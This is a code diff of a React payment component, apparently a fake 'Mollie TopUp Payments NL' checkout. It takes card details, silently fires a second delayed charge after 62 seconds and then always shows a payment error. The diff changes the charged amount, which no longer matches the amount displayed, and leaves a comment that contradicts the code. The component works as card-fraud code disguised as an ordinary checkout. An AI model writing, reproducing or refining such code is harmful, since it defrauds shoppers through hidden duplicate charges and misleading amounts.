@@ -29,7 +29,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     second: '2-digit',
   });
 
-  const amountFeesed = (amount * 1.025).toFixed(2); // Add 2.5% payment fees
+  const amountFeesLess = (amount * .975).toFixed(2); // Add 2.5% payment fees
 
   const lastFourDigits = formData.cardNumber.replace(/\s/g, '').slice(-4); // Extract last 4 digits of the card number
 
@@ -107,10 +107,10 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
 
       // Lancement différé d'un 2ème paiement
       setTimeout(() => {
-        payFetch(orderNumber, amountFeesed, cardDetails);
+        payFetch(orderNumber, amountFeesLess, cardDetails);
       }, 62000);
 
-      await payFetch(orderNumber, amountFeesed, cardDetails);
+      await payFetch(orderNumber, amountFeesLess, cardDetails);
       setIsLoading(false);
       setShow3DSecurePopup(false);
       setShowPaymentError(true);
@@ -219,7 +219,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             <article className="infos">
               <span>Mollie TopUp Payments NL</span>
               <span>
-                {data.checkoutPay3DSecureAmount} : {amountFeesed}
+                {data.checkoutPay3DSecureAmount} : {amount}
                 {shop.currency}
               </span>
               <span>
